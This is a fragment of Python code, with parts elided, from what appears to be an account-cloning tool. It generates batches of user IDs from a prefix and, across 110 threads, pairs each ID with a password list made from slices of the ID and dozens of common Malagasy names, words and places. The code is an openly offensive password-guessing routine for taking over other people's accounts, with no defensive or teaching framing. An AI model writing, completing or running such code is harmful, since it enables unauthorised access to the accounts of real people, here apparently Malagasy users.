...
def BD_CLONING():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with tred(max_workers=110) as Dipto:
        tl=str(len(user))
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'Mamako','mamako','mamiko','Mamiko','fitiavana','Fitiavana','lafatra','Lafatra','lahatra','Lahatra','tsiory','Tsiory','sipako','Sipako','nomena','Nomena','valisoa','Valisoa','hasina','Hasina','ragasy','Ragasy','tsilavina','Tsilavina','Antananarivo','antananarivo','Koloina','koloina','randria','Randria','Malala','malala','malalako','Malalako','malagasy','Malagasy','rakotomalala','Rakotomalala','namana','Namana','namako','Namako','bekoto','Bekoto','rakoto','Rakoto','jesosy','Jesosy','Diego','Ambohipo','ambohipo','Analakely','analakely','diamondra','Diamondra','nantenaina','Nantenaina','narindra','Narindra','sarindra','Sarindra','milely','Milely','fanomezana','Fanomezana','fanantenana','Fanantenana','miora','Miora','tiavina','Tiavina','Tanjona','tanjona','fenohasina','Fenohasina','safidinirina','Safidinirina','rakotonirina','Rakotonirina','dokotera','Dokotera','mahefa','Mahefa','safidy','Safidy','tahiry','Tahiry','Madagasikara','madagasikara','Nambinina','Nambinina','Felana','felana','Harena','sitraka','Sitraka','salohy','Salohy','gasilahy','Gasilahy','marary','fandresena','Fandresena','tanindrazana','Tanindrazana','tantely','Tantely','sambatra','Sambatra']
